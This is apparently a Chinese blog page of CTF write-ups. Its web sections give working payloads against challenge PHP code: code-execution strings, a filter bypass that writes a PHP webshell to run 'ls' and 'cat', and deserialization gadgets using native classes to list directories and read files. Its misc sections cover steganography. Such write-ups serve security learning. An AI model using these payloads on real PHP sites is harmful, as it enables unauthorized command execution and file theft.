<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">getcwd() 函数返回当前工作目录。</span><br><span class="line">getchwd() 函数返回当前工作目录。</span><br><span class="line">scandir() 函数返回指定目录中的文件和目录的数组。</span><br><span class="line">dirname() 函数返回路径中的目录部分。</span><br><span class="line">readfile() 输出一个文件</span><br><span class="line">current() 返回数组中的当前单元, 默认取第一个值</span><br><span class="line">next()  函数将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line">end()  将内部指针指向数组中的最后一个元素，并输出。</span><br><span class="line">chr()  函数从指定的 ASCII 值返回字符。</span><br><span class="line">hex2bin()  转换十六进制字符串为二进制字符串</span><br><span class="line">getenv()  获取一个环境变量的值</span><br><span class="line">show_source()  高亮读取文件</span><br></pre></td></tr></table></figure>

<p><img src="https://note.youdao.com/yws/api/personal/file/WEB309565579e91358445645db65af8db0c?method=download&shareKey=0879ed099356c41720470e8b46790515"></p>
</li>
<li><p>那就试着用上面列举能用的函数构造，看一下目录里有没有flag，用<code>getcwd()</code>获取目录，再用<code>scandir()</code>读出文件，最后用<code>print_r()</code>打印出来。成功读出目录，flag在最后。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?str&#x3D;a:2:&#123;s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;&#125;&amp;code&#x3D;print_r(scandir(getcwd()));</span><br></pre></td></tr></table></figure>

<p><img src="https://note.youdao.com/yws/api/personal/file/WEBefbc096c94eac759efdbf80b5bebbef2?method=download&shareKey=dbf109e1655ad719b765d781402a49e6"></p>
</li>
<li><p>既然flag在最后，<code>end()</code>指向最后一个元素，再用<code>readfile()</code>输出就行了，最后在源码里拿到flag。</p>
<p>flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;53ea5ab2-165f-4b23-bd25-e06db69970d8&#125;</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?str&#x3D;a:2:&#123;s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;&#125;&amp;code&#x3D;readfile(end(scandir(getcwd())));</span><br></pre></td></tr></table></figure>

<p><img src="https://note.youdao.com/yws/api/personal/file/WEB9cf9da5f0d9a448d6086f49daad6fb84?method=download&shareKey=2d9bf859d9e7b7eeb0664f1140347a88"></p>
</li>
</ul>
<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>这是一道代码审计的题</p>
<ul>
<li><p>直接给出源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">$input</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,$input))&#123;</span><br><span class="line">        <span class="comment">// if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $input;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$input</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(is_array($input))&#123;</span><br><span class="line">      <span class="keyword">foreach</span>($input <span class="keyword">as</span> $key=&gt;$output)&#123;</span><br><span class="line">          $input[$key] = waf($output);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      $input = check($input);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$dir = <span class="string">&#x27;sandbox/&#x27;</span> . md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!file_exists($dir))&#123;</span><br><span class="line">    mkdir($dir);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span>($_GET[<span class="string">&quot;action&quot;</span>] ?? <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;pwd&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> $dir;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;upload&#x27;</span>:</span><br><span class="line">        $data = $_GET[<span class="string">&quot;data&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line">        waf($data);</span><br><span class="line">        file_put_contents(<span class="string">&quot;<span class="subst">$dir</span>&quot;</span> . <span class="string">&quot;index.php&quot;</span>, $data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>先看一下<code>file_put_contents</code>写入文件的地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action&#x3D;pwd</span><br></pre></td></tr></table></figure>

<p><img src="https://note.youdao.com/yws/api/personal/file/WEB46b0fbfd8ca6f6711205bf63e7f93500?method=download&shareKey=162f108387614640ab28d2bfa49457a6"></p>
</li>
<li><p>php空格啥的都被过滤掉，尝试用%09替代空格，用短标签绕过php限制，看文件列表。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;&#96;ls%09&#x2F;&#96;?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://note.youdao.com/yws/api/personal/file/WEBed403fcbd0df826c47b346e18a92c5db?method=download&shareKey=a64079c668eb5ad4a48e69c4e88df282"></p>
</li>
<li><p>用上面得到的地址<code>/sandbox/d65ad202e966d8bef3d5042ce9e0b877/</code>看到文件列表,显然flag在最后的<code>xxxaf14gss.php</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">bin </span><br><span class="line">boot </span><br><span class="line">dev </span><br><span class="line">etc </span><br><span class="line">home </span><br><span class="line">lib </span><br><span class="line">lib64 </span><br><span class="line">media </span><br><span class="line">mnt </span><br><span class="line">opt </span><br><span class="line">proc </span><br><span class="line">root </span><br><span class="line">run </span><br><span class="line">sbin </span><br><span class="line">srv </span><br><span class="line">sys </span><br><span class="line">tmp </span><br><span class="line">usr </span><br><span class="line">var </span><br><span class="line">xxxaf14gss.php </span><br></pre></td></tr></table></figure>
</li>
<li><p>php被过滤，用通配符读，同样用上述地址读到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;&#96;cat%09&#x2F;xxxaf14gss.*&#96;?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://note.youdao.com/yws/api/personal/file/WEB2356bfb6bbfb048a15c80348696210c6?method=download&shareKey=bcb3483c79a5d3aab64e0e0d6c7965b8"></p>
</li>
</ul>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="隐藏的书"><a href="#隐藏的书" class="headerlink" title="隐藏的书"></a>隐藏的书</h2><ul>
<li><p>解压出来是一份知网文献和一个txt，txt里有不可见字符。</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB6a2e9b5dd800dd03d87e8b33264348d8?method=download&shareKey=87b709ccce0e9b4199528e72ef600766"></p>
</li>
<li><p>题目说是隐藏的书，刚开始以为flag在是pdf里，用wbStego43open试一下解密，发现没东西,好吧应该不在pdf里，毕竟txt文件名是flag。</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB9b2754c0513f5039423a04994e9b5f1e?method=download&shareKey=48a2fc4c81e98f9dff84905a66de85b6"></p>
</li>
<li><p>那把txt放进binwalk，结果什么都没有。</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB595bbaa7389d28c0180b5e1cf9115e59?method=download&shareKey=b65885afe54f533374502a47ead963aa"></p>
</li>
<li><p>拖进kali发现有类似flag的东西</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB4cf6b2894d4be8884ce6fcbf5c96f476?method=download&shareKey=76493c043c30d30c867aeec2fecbf822"></p>
</li>
<li><p>给出提示，文献内容是加密方法，看了文献这段话，以为只有圈出来的这一小段。</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBec6e8c74dbfc4c46dda67fe59b0073e9?method=download&shareKey=8cef8b303ed4af9f066c30b5a32ad6df"></p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB78b1b5e3c382f6ea5c6b44539bc490c6?method=download&shareKey=3434ba34ee24d550c248eaf9084b4130"></p>
</li>
<li><p>文献写到的解密方法是找到对应的ASCII值，那拖进winhex看看，每个字符对应的ASCII值都是不可打印字符。</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB3bb30aacff1d4a44443e1035719326a5?method=download&shareKey=a5210b9bfaeb15657052e75fcd22362c"></p>
</li>
<li><p>那再看下文献，发现是两个字符对应一个英文字符，那就对了，但对应解出来只有前面一部分。</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBaefe1f3f6555d8852300616484fb2993?method=download&shareKey=2785f447840c57ea6cbc4932c804d1de"></p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB36e6ef1cd71128f96825049647d5936d?method=download&shareKey=b3133f1febe4482ca9ed0a76f3b3854e"></p>
</li>
<li><p>会不会是前面分析的加密区段不对，果断看了后面，发现是<code>&#125;</code>,那就对了，整个不可见字符都是flag。对照ASCII表解就得到flag。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;8f807f74-9088-11eb-b255-00163e0620b4&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://note.youdao.com/yws/api/personal/file/WEB1dcdb41342ef409e39ff26cdbf54f7b6?method=download&shareKey=2720c5c7a0b0df222d6666bb75549637"></p>
</li>
</ul>
<h2 id="你能看到图片里的flag吗"><a href="#你能看到图片里的flag吗" class="headerlink" title="你能看到图片里的flag吗"></a>你能看到图片里的flag吗</h2><ul>
<li><p>文件给了一个压缩包，解压后是两张图和一个压缩包，有一说一，这张图有点熟悉。</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBcdcb630dcff1a162cd38f430ed04e3e3?method=download&shareKey=398d3dbc89e071a2cd5214e3de176dc5"></p>
</li>
<li><p>题目提示flag在图里，直接丢Stegsolve看一下，直接看到flag，用红笔描出来。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Th1s_1s_4_h1dden_F14g&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://note.youdao.com/yws/api/personal/file/WEB16086ad5bd1fec886b68f7236bf7c50f?method=download&shareKey=a9a1348d236bdab0ba9a5d0f8a03c4cd"></p>
</li>
</ul>
<h2 id="神秘的铃声"><a href="#神秘的铃声" class="headerlink" title="神秘的铃声"></a>神秘的铃声</h2><ul>
<li><p>打开音频是一段 DTMF音频 ，有一个网站可以解，解出来是一段类似于密码的玩意</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;dialabc.com&#x2F;sound&#x2F;detect&#x2F;index.html</span><br></pre></td></tr></table></figure>

<p><img src="https://note.youdao.com/yws/api/personal/file/WEB6a31273b34f252bbe8700eeb58a8162d?method=download&shareKey=1e0bb464540b6e338eccfee8f2b98028"></p>
</li>
<li><p>将音频丢010editor看一下，有一个提示异常，是一段base64编码</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB6bb9a6998e53deec4c737340882ec5ee?method=download&shareKey=7abe94aa5432dbaa8ab7cb5810bd134b"> </p>
</li>
<li><p>解码后是一段PK开头的字符串</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBa17daf39e33ed62ef0972d04a6395065?method=download&shareKey=7face67ffdd7b1998c43c02ac16b5cf8"></p>
</li>
<li><p>弄成压缩包,里面有个txt文件，需要密码</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBe8ff543b57a6ff987df3a22f36f3920d?method=download&shareKey=7c01c316b6355eec73dba80593bd4415"></p>
</li>
<li><p>用上面的密码试下，里面是一串坐标</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB818a749c355916e11ad02d09d98c15be?method=download&shareKey=d2dc4186bc32a3f4bdcb17c90cf65d48"></p>
</li>
<li><p>用脚本写出图片，是一个二维码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (<span class="number">260</span>, <span class="number">260</span>), (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">f = open(<span class="string">&#x27;flag.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">    point = line.split()</span><br><span class="line">    img.putpixel((int(point[<span class="number">0</span>]), int(point[<span class="number">1</span>])), (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</span><br><span class="line">f.close()</span><br><span class="line">img.show()</span><br></pre></td></tr></table></figure>

<p><img src="https://note.youdao.com/yws/api/personal/file/WEBcc4cfa891dbdb63b4794e50a47781160?method=download&shareKey=a2e93162e804a3a1b256233165a1418f"></p>
</li>
<li><p>扫一下二维码就得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hsnctf&#123;8384b52d-6b32-49d8-a0be-1bb15e9985dc&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="神秘的网站"><a href="#神秘的网站" class="headerlink" title="神秘的网站"></a>神秘的网站</h2><p>这题差点做出来</p>
<ul>
<li><p>是个流量包，用 Wireshark 打开，提示上传包有文件，找到这个压缩包</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB57bffeb889343a0a9f9b47cbacfe98ea?method=download&shareKey=b9e41c2f944078d812e585fa0360bf6f"></p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB49325751bb52341219dc5ff7ff1ca90b?method=download&shareKey=c25c2de7a3db905c8a809b20575b22d1"></p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBf6a9c91b9abba26023204b7118ff8643?method=download&shareKey=94a969a746549f936f00ebfc71540653"></p>
</li>
<li><p>压缩包里有一个flag文件和一张图片</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB9f9981a14e5fbbf60ae45dc70de72efb?method=download&shareKey=197326d9494c1246e529d35f4361d878"></p>
</li>
<li><p>先看图片，根据提示有个chunk长度异常，丢010看一下，将数据改大，得到隐藏字符</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBc31c5dc5d6ea84247064479388072dbc?method=download&shareKey=ff177a7a5aab997b9fb2b640fb5512ef"></p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB35f52f46c20b56d14c5a54e85efc419d?method=download&shareKey=6c2d5789bbc8bd782627677d161f1c91"></p>
</li>
<li><p>将flag文件弄进winhex，发现是一个倒置的压缩包</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBadd61c0a6c97ecae4b6131f12738d60b?method=download&shareKey=84c8baa6a294c6a1012d77d54097a9f4"></p>
</li>
<li><p>脚本转换一下，得到一个加密音频</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">  </span><br></pre></td></tr></table></figure>

<p><img src="https://note.youdao.com/yws/api/personal/file/WEB209dd1103d4d38d76efe03f92e4c23c6?method=download&shareKey=2640afe1a936acb1e15050b23d7ac720"></p>
</li>
<li><p>用图片里的密码解密，得到一段倒置的音频，用AU反置。</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB575993d490ac326ace2f30e3ede74945?method=download&shareKey=06bbaf140eff99fdcf7f0c98eb7c6bb5"></p>
</li>
<li><p>最后用网易云识别，在评论区拿到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;034d7bac-92b2-11eb-9310-00163e12fb24&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/03/29/DASCTF%E4%B8%89%E6%9C%88%E8%B5%9B%E5%A4%8D%E7%8E%B0writeup/">DASCTF三月赛复现writeup</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-03-29</time><div class="content"><p>题目很好，我很菜，一道都没做出来，只能靠师傅们的writeup复现了。其他题等有环境再复现。</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.plasf.cn/articles/dasctf202103.html">https://www.plasf.cn/articles/dasctf202103.html</a></p>
</blockquote>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="ez-serialize"><a href="#ez-serialize" class="headerlink" title="ez_serialize"></a>ez_serialize</h2><p>这道题当时有思路，但是做不出来，看Gq师傅的writeup后才知道，学到了新知识。</p>
<ul>
<li><p>题目直接给源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $class;</span><br><span class="line">    <span class="keyword">public</span> $para;</span><br><span class="line">    <span class="keyword">public</span> $check;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class = <span class="string">&quot;B&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;para = <span class="string">&quot;ctfer&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="keyword">$this</span>-&gt;class (<span class="keyword">$this</span>-&gt;para);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;check = <span class="keyword">new</span> C;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;check-&gt;vaild(<span class="keyword">$this</span>-&gt;para) &amp;&amp; <span class="keyword">$this</span>-&gt;check-&gt;vaild(<span class="keyword">$this</span>-&gt;class)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="keyword">$this</span>-&gt;class (<span class="keyword">$this</span>-&gt;para);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;bad hacker~&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $a;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$a</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = $a;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;hello &quot;</span>.<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">vaild</span>(<span class="params">$code</span>)</span>&#123;</span><br><span class="line">        $pattern = <span class="string">&#x27;/[!|@|#|$|%|^|&amp;|*|=|\&#x27;|&quot;|:|;|?]/i&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (preg_match($pattern, $code))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    unserialize($_GET[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> A;</span><br><span class="line"></span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
</li>
<li><p>序列化反序列化的题，可以动态拼接类，Gq师傅用原生类读文件。</p>
<blockquote>
<p>官方文档<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/book.spl.php">https://www.php.net/manual/zh/book.spl.php</a></p>
</blockquote>
<p>这里借用Gq师傅的表格</p>
<table>
<thead>
<tr>
<th>类</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>DirectoryIterator</td>
<td>遍历目录</td>
</tr>
<tr>
<td>FilesystemIterator</td>
<td>遍历目录</td>
</tr>
<tr>
<td>GlobIterator</td>
<td>遍历目录，但是不同的点在于它可以通配例如/var/html/www/flag*</td>
</tr>
<tr>
<td>SplFileObject</td>
<td>读取文件，按行读取，多行需要遍历</td>
</tr>
<tr>
<td>finfo/finfo_open()</td>
<td>需要两个参数</td>
</tr>
</tbody></table>
</li>
<li><p>用<code>FilesystemIterator</code>遍历/var/www/html，找到包含flag的文件。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $class=<span class="string">&#x27;FilesystemIterator&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> $para=<span class="string">&quot;/var/www/html&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $check;</span><br><span class="line">    &#125;</span><br><span class="line">$o  = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> serialize($o);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://note.youdao.com/yws/api/personal/file/WEBb8fb20554988460b12a9ec271a25d838?method=download&shareKey=7a740fd9726050a841fa2d2892a2537e"></p>
</li>
<li><p>再用<code>SplFileObject</code>读文件上述文件夹，找到flag.php。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $class=<span class="string">&#x27;SplFileObject&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> $para=<span class="string">&quot;/var/www/html/aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE/flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $check;</span><br><span class="line">    &#125;</span><br><span class="line">$o = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> serialize($o);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://note.youdao.com/yws/api/personal/file/WEB2ac6ee624f7924022d5810d5e458309f?method=download&shareKey=dc2f4c9cdbf177cfc99ed3daadcbb6c7"></p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB466f68270c72e85aaddfcddf82039808?method=download&shareKey=cc035a659dfc28b581cbdceadf84040f"></p>
</li>
</ul>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><ul>
<li><p>关注公众号念词，识别正确就给flag，有一说一这普通话还真不容易。</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB5d4ecefaa0f75b9ca9072be53bb07c13?method=download&shareKey=46387282b3ea12983e7337bf5f05424f"></p>
</li>
</ul>
<h2 id="简单的png隐写"><a href="#简单的png隐写" class="headerlink" title="简单的png隐写"></a>简单的png隐写</h2><ul>
<li><p>ctf一般不会没提示让爆破，猜测是伪加密，果不其然两个图。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ZipCenOp.jar r 简单的png隐写的附件.zip</span><br></pre></td></tr></table></figure>



</li>
</ul>
<p>  <img src="https://note.youdao.com/yws/api/personal/file/WEBc1f5c06c05ad11aef56195f856f70125?method=download&shareKey=d7982a2c5a9242a56fb2631079cf30fa"></p>
<ul>
<li><p>题目是png隐写，那先从png这张图看，当时做的时候重心偏在jpg了，丢tweakpng里看一下，发现有两个IDAT块。</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB26f9a56309501e92d76ee44f6bf81933?method=download&shareKey=a7da92173b9f62af4f4a80dd0987537b"></p>
</li>
<li><p>将上面四条删除，重新保存，出现一张提示，<code>89504E</code>是密码，用outguess解。</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB3dfd4da378b26803461f29cae4beb2a3?method=download&shareKey=cd4230ab091b2f45e2c6f50e13012253"></p>
</li>
<li><p>用outguess解完是一串base64编码的字符串。</p>
